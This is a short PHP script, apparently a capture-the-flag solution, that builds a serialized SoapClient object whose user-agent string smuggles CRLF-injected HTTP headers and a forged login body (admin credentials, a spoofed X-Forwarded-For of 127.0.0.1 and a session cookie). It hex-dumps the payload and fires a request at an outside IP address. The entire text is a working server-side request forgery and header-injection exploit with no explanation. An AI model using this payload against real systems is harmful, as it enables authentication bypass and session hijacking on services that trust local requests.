<?php
$post_string = 'username=admin&password=nu1ladmin&code=37840'; 
$headers = array(
  'X-Forwarded-For: 127.0.0.1',    
  'Cookie: PHPSESSID=p60errje2ocsd10nsetivj83f4'    
); 
$a = new SoapClient(null,array(
  'location' => 'http://123.206.203.108:9876',
  'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));
$aaa = serialize($a); 
$aaa = str_replace('^^',"\r\n",$aaa); 
$aaa = str_replace('&','&',$aaa);
$a = unserialize($aaa);
echo bin2hex($aaa);
$a->getsubtime();